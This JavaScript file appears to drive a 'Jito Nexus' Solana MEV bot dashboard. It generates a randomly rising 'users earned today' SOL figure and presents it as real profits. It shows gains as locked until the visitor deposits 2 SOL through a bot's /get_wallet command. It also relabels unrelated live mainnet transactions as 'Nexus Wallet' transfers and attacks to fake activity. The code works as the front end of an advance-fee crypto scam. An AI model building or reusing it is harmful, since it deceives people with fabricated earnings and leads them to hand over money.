let currentBalance = 0;
let startTime = new Date();
let chart;

document.addEventListener("DOMContentLoaded", function() {
    initializeApp();
    setInterval(updateApp, 1000); // Update every second
});

function initializeApp() {
    currentBalance = Math.random() * (16000 - 145) + 145;
    startTime = new Date();
    updateTodayStats();
    initializeWallet();
    updateMyGains();
    fetchRecentTransactions();
    initializeStatsGraph();
    showTab('today-stats'); // Show Today's Stats tab by default
}

function updateApp() {
    const now = new Date();
    if (now - startTime >= 24 * 60 * 60 * 1000) {
        initializeApp(); // Reset after 24 hours
    } else {
        updateTodayStats();
        fetchRecentTransactions();
    }
}

function updateTodayStats() {
    const elapsedTime = (new Date() - startTime) / 1000; // Time elapsed in seconds
    const maxIncrease = 16000 - currentBalance; // Maximum possible increase
    const increaseRate = maxIncrease / (24 * 60 * 60); // Increase rate per second
    currentBalance += increaseRate * (Math.random() * 0.5 + 0.75); // Random increase between 75% and 125% of the average rate

    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
    document.getElementById("stats-description").textContent = 
        `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
    updateStatsGraph();
}

function initializeWallet() {
    document.getElementById("wallet-instructions").innerHTML = 
        "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type <strong>/get_wallet</strong>. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
}

function updateMyGains() {
    document.getElementById("gains-message").innerHTML = 
        "🔒 Locked: To access your gains, please deposit 2 SOL. Head to the bot and type <strong>/get_wallet</strong> to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!";
}

const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));

async function fetchRecentTransactions() {
    try {
        const recentBlockhash = await connection.getRecentBlockhash();
        const recentBlock = await connection.getBlock(recentBlockhash.blockhash);

        if (!recentBlock || !recentBlock.transactions) {
            throw new Error("Failed to fetch recent block data");
        }

        const processedTransactions = recentBlock.transactions
            .filter(tx => tx.meta && !tx.meta.err)
            .slice(0, 10) // Limit to 10 transactions
            .map(tx => {
                const { transaction, meta } = tx;
                const isTransfer = transaction.message.instructions.some(ix => 
                    ix.programId.equals(solanaWeb3.SystemProgram.programId));
                const isSwap = transaction.message.instructions.some(ix => 
                    ix.programId.toBase58() === 'SwaPpA9LAaLfeLi3a68M4DjnLqgtticKg6CnyNwgAC8');

                let type, amount, fromAddress, toAddress;

                if (isTransfer) {
                    type = 'transfer';
                    const transferIx = transaction.message.instructions.find(ix => 
                        ix.programId.equals(solanaWeb3.SystemProgram.programId));
                    if (transferIx) {
                        amount = meta.postBalances[transferIx.accounts[1]] - meta.preBalances[transferIx.accounts[1]];
                        fromAddress = transaction.message.accountKeys[transferIx.accounts[0]].toBase58();
                        toAddress = transaction.message.accountKeys[transferIx.accounts[1]].toBase58();
                    }
                } else if (isSwap) {
                    type = 'swap';
                    amount = 'Token Swap';
                    fromAddress = transaction.message.accountKeys[0].toBase58();
                    toAddress = 'N/A';
                } else {
                    type = 'other';
                    amount = 'Unknown';
                    fromAddress = transaction.message.accountKeys[0].toBase58();
                    toAddress = 'N/A';
                }

                return {
                    type,
                    amount: type === 'transfer' ? (amount / solanaWeb3.LAMPORTS_PER_SOL).toFixed(4) + ' SOL' : amount,
                    time: new Date().toLocaleTimeString(),
                    fromAddress: fromAddress.slice(0, 4) + '...' + fromAddress.slice(-4),
                    toAddress: toAddress !== 'N/A' ? toAddress.slice(0, 4) + '...' + toAddress.slice(-4) : toAddress
                };
            });

        displayTransactions(processedTransactions);
    } catch (error) {
        console.error("Error fetching recent transactions:", error);
        document.getElementById("transactions-list").innerHTML = "Error fetching transactions";
    }
}

function displayTransactions(transactions) {
    const transactionsList = document.getElementById("transactions-list");
    transactionsList.innerHTML = "";
    transactions.forEach(tx => {
        const txElement = document.createElement("div");
        txElement.className = "transaction";
        if (tx.type === 'transfer') {
            txElement.innerHTML = `
                <h3>Nexus Wallet Transfer</h3>
                <p>Amount: ${tx.amount} transferred at ${tx.time}</p>
                <p>From: ${tx.fromAddress} To: ${tx.toAddress}</p>
            `;
        } else if (tx.type === 'swap') {
            txElement.innerHTML = `
                <h3>Nexus Wallet Attack</h3>
                <p>Token Swap occurred at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        } else {
            txElement.innerHTML = `
                <h3>Other Transaction</h3>
                <p>Unknown transaction type at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        }
        transactionsList.appendChild(txElement);
    });
}

function showTab(tabId) {
    const tabs = document.getElementsByClassName("tab-content");
    for (let tab of tabs) {
        tab.classList.remove("active");
    }
    document.getElementById(tabId).classList.add("active");
}

function initializeStatsGraph() {
    const ctx = document.getElementById('stats-graph').getContext('2d');
    chart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'SOL Balance',
                data: [],
                borderColor: 'rgba(0, 255, 255, 1)',
                borderWidth: 2,
                fill: false,
                pointRadius: 0
            }]
        },
        options: {
            responsive: true,
            animation: {
                duration: 0
            },
            scales: {
                x: {
                    type: 'time',
                    time: {
                        unit: 'hour',
                        displayFormats: {
                            hour: 'HH:mm'
                        }
                    },
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)'
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                },
                y: {
                    beginAtZero: false,
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)'
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                }
            },
            plugins: {
                legend: {
                    display: false
                }
            }
        }
    });
}

function updateStatsGraph() {
    const now = new Date();
    chart.data.labels.push(now);
    chart.data.datasets[0].data.push(currentBalance);
    if (chart.data.labels.length > 100) {
        chart.data.labels.shift();
        chart.data.datasets[0].data.shift();
    }
    chart.update();
}